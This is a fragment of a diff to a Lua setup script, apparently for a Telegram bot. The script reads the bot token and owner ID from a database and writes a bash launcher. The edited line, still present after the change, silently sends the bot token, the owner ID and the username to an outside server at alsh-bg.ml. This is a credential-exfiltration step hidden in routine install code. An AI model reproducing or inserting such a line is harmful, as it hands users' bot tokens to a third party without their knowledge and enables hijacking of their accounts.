@@ -71,7 +71,7 @@ token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
-https.request("https://alsh-bg.ml/api/?token="..token.."&id="..SUDO.."&username="..username)
+https.request("https://alsh-bg.ml/api/?token="..token.."&id="..SUDO.."&username="..UserName)
 file = io.open("AlBaghdadi", "w")  
 file:write([[
 #!/usr/bin/env bash
